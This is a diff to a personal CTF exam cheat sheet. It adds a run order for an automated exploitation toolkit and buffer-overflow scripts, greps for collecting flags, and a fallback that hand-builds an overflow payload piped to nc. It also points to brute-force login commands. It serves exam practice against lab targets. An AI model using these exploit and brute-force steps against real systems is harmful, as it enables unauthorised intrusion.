@@ -7,6 +7,36 @@ Two tools:
 - `ctf` = classmate's kit (all categories). Installed as a command. Help: `ctf --help` · check the machine: `ctf --doctor $IP`
 - `bof-scripts/` = my own (overflow + format string only). Run from the folder that contains `bof-scripts/`.
 
+# Start here: every script first, in this order
+```bash
+# 0. once
+export IP=<target>                                   # second target in the paper → second tab, export IP again there
+mkdir -p ~/exam/files && cd ~/exam                   # put EVERY download in ~/exam/files (captures, images, binaries, .c, wordlists)
+ctf --doctor $IP                                     # 10 s: tools fine? target answers?
+
+# 1. tab 1 — the long one, start it and LEAVE it (~13 min)
+ctf --auto $IP --files ~/exam/files | tee auto.txt
+
+# 2. tab 2 — the quick ones, while tab 1 runs
+ctf --enum $IP | tee enum.txt                        # ~2 min: ports, services, web sites → ends with a numbered list
+ctf --do 1                                           # run entry 1 of that list, then 2, 3 …   ( ctf --do list )
+ctf --folder ~/exam/files | tee files.txt            # every downloaded file: captures, images, hashes, zips
+
+# 3. tab 2 — one line per web page the paper names
+ctf --auto-web "http://$IP/page" | tee web.txt
+
+# 4. tab 3 — one line per binary service (nc HOST PORT in the paper)
+python3 bof-scripts/go.py $IP $PORT ./chall chall.c  # give the files you have; add  --flag-regex '[A-Za-z0-9]{32}'  if the paper's flags are bare strings
+ctf --pwn $IP:$PORT --binary ./chall --src chall.c   # only if go.py ends with NO FLAG
+
+# 5. collect
+ctf --show                                           # every flag found so far, and where it came from
+grep -aoE '\b[A-Za-z0-9]{32}\b' *.txt | sort -u     # what the flags box may have skipped
+grep -aiE 'flag|FLAGSTEG|part [0-9]/[0-9]' *.txt
+```
+6. Tick off the questions these answered. Each question still open → the table below gives its one script line and its by-hand page.
+7. Passwords are never guessed automatically: `--enum` prints the ready `--form-brute` / `--http-brute` / `--brute` line → run it in its own tab.
+
 # Game plan
 ```bash
 export IP=<target>                              # every command below uses $IP
@@ -63,6 +93,34 @@ NOT in the box, but still in the output above it → **scroll up and read**:
 export FLAGFMT=WORD            # paper uses another wrapper WORD{…} → the box then lists it
 ctf --show                     # every flag and finding so far
 ```
+Box empty, or fewer flags than questions → keep the output and search it yourself:
+```bash
+ctf --enum $IP | tee out.txt                              # add  | tee out.txt  to ANY ctf command: same output on screen + saved
+grep -aoE '\b[0-9a-f]{32}\b' out.txt | sort -u            # 32-character hex answers (the box skips these)
+grep -aoE '\b[A-Za-z0-9]{32}\b' out.txt | sort -u         # any 32 letters+digits
+grep -aiE 'flag|FLAGSTEG|part [0-9]/[0-9]' out.txt        # labelled answers, steghide text, pieces of a split flag (join them in order)
+```
+Half a flag (`WORD{first_half_` here, `_second_half}` somewhere else) and plain answers (a name, a password) have no shape: only reading finds them.
+
+**`bof-scripts` says "NO FLAG" — contingency, in this order** (do not read the whole screen):
+
+Why it can happen on a correct exploit: the script only knows it won when the reply LOOKS like a flag (a wrapper `WORD{…}`, a "flag: …" label, or 16–64 hex characters). A service that just prints `Congratulations! 2xkC…Kzn9` is not recognised: the script carries on for 3 minutes, ends with "NO FLAG", and the winning reply is neither shown nor saved.
+```bash
+# 1. run it again and tell it what success looks like (5 s when this was the reason)
+python3 bof-scripts/go.py $IP $PORT ./chall --flag-regex '(?i)(congrat|granted|unlock|well done|you win)[^\n]*'
+python3 bof-scripts/go.py $IP $PORT ./chall --flag-regex '[A-Za-z0-9]{32}'      # the paper's other flags are bare 32-character strings → say so from the START
+
+# 2. still nothing → watch what the service really answers. The failed run ends with a numbered list of commands
+#    ("1. ret2win … python3 …/auto_pwn.py --host … --port …"). Copy the FIRST one, add --verbose, keep the output:
+<that auto_pwn.py command> --verbose | tee v.txt
+grep -avE '^\[|^=|^$' v.txt | sort | uniq -c | sort -n | head -20        # the service's own lines, rarest first: the line seen ONCE is the win
+grep -aiE 'congrat|grant|unlock|flag|\{' v.txt                            # or look for the usual success words
+#    format string instead:  python3 bof-scripts/fmtpwn.py $IP $PORT --binary ./chall --verbose | tee v.txt
+
+# 3. still nothing → by hand with the numbers the script already found (its report lists "RET offset candidates" and the address):
+python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*<offset> + struct.pack("<I",0x<address>) + b"\n")' | nc -w3 $IP $PORT     # 64-bit: "<Q"
+```
+Then `ctf --pwn $IP:$PORT --binary ./chall` in another tab, and [12_bof](12_bof.md) / [13_fmt](13_fmt.md).
 
 ### Helpline
 ```bash
